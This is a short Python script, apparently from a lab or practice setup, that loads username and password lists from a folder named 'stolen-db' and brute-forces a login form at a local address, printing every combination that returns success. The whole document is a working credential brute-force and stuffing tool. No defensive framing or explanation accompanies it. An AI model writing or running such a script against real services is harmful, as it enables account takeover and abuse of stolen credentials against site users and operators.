import requests

# Read usernames and passwords
with open('../stolen-db/usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

with open('../stolen-db/passwords.txt', 'r') as f:
    passwords = f.read().splitlines()

url = "http://127.0.0.1:3001/login"

# Basic brute force loop
for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"[+] SUCCESS: {username}:{password}")
        else:
            print(f"[-] failed: {username}:{password} - Status Code: {response.status_code}")
            
